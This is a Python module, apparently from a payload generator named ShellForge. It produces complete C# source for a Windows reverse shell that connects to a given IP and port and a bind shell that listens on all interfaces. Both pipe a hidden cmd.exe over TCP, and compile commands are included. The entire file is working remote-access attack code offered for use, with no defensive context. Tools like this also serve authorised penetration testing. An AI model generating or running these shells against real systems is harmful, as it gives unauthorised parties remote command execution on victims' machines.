"""
C# reverse and bind shell payload generators.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class CsharpGenerator(PayloadGenerator):
    """Standard C# TcpClient reverse/bind shells."""

    def reverse(self, ip: str, port: int) -> str:
        return self.reverse_script(ip, port)

    def bind(self, port: int) -> str:
        return self.bind_script(port)

    def file_extension(self) -> str:
        return ".cs"

    def reverse_script(self, ip: str, port: int) -> str:
        return f"""// ShellForge C# Reverse Shell
// Author: Mostafa Tamime
// Compile: csc Reverse.cs && Reverse.exe
// Target: {ip}:{port}

using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace ShellForge
{{
    public class Reverse
    {{
        static StreamWriter streamWriter;

        public static void Main(string[] args)
        {{
            using (TcpClient client = new TcpClient("{ip}", {port}))
            {{
                using (Stream stream = client.GetStream())
                {{
                    using (StreamReader rdr = new StreamReader(stream))
                    {{
                        streamWriter = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();
                        p.BeginErrorReadLine();
                        while (true)
                        {{
                            string input = rdr.ReadLine();
                            if (input == null) break;
                            p.StandardInput.WriteLine(input);
                        }}
                    }}
                }}
            }}
        }}

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {{
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {{
                try
                {{
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }}
                catch (Exception) {{ }}
            }}
        }}
    }}
}}
"""

    def bind_script(self, port: int) -> str:
        return f"""// ShellForge C# Bind Shell
// Author: Mostafa Tamime
// Compile: csc Bind.cs && Bind.exe
// Port: {port}

using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;

namespace ShellForge
{{
    public class Bind
    {{
        static StreamWriter streamWriter;

        public static void Main(string[] args)
        {{
            TcpListener listener = new TcpListener(IPAddress.Any, {port});
            listener.Start();
            using (TcpClient client = listener.AcceptTcpClient())
            {{
                using (Stream stream = client.GetStream())
                {{
                    using (StreamReader rdr = new StreamReader(stream))
                    {{
                        streamWriter = new StreamWriter(stream);
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();
                        p.BeginErrorReadLine();
                        while (true)
                        {{
                            string input = rdr.ReadLine();
                            if (input == null) break;
                            p.StandardInput.WriteLine(input);
                        }}
                    }}
                }}
            }}
            listener.Stop();
        }}

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {{
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {{
                try
                {{
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }}
                catch (Exception) {{ }}
            }}
        }}
    }}
}}
"""
